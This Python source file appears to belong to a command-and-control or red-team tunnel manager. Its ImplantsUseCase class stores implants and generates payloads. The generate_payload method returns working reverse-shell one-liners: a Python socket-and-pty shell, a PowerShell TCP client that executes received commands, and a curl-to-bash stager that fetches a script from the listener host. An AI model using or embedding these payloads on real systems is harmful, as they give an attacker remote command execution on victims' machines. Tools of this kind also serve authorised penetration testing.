from typing import List, Dict
from datetime import datetime
from tunnelsManager.models.implant import Implant
from tunnelsManager.ports.drivers.forImplantManagement import ForImplantManagement
from tunnelsManager.ports.drivens.forImplantRepository import ForImplantRepository

class ImplantsUseCase(ForImplantManagement):
    def __init__(self, repository: ForImplantRepository):
        self.repository = repository

    def create_implant(self, name: str, implant_type: str = Implant.TYPE_PYTHON, payload: str = "", description: str = "", supported_tunnel_type: str = None) -> Implant:
        implant = Implant(
            id=None,
            name=name,
            implant_type=implant_type,
            payload=payload,
            description=description,
            created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            supported_tunnel_type=supported_tunnel_type
        )
        return self.repository.save_implant(implant)


    def list_implants(self) -> List[Implant]:
        return self.repository.list_implants()

    def get_implant(self, implant_id: int) -> Implant:
        return self.repository.get_implant(implant_id)

    def delete_implant(self, implant_id: int) -> bool:
        return self.repository.delete_implant(implant_id)

    def generate_payload(self, implant_type: str, listener_ip: str, listener_port: int) -> str:
        if implant_type == Implant.TYPE_PYTHON:
            return f"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{listener_ip}',{listener_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
        elif implant_type == Implant.TYPE_POWERSHELL:
            return f"$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        elif implant_type == Implant.TYPE_STAGER:
            return f"curl -s http://{listener_ip}:{listener_port}/shell.sh | bash"
        return "# Custom Payload"
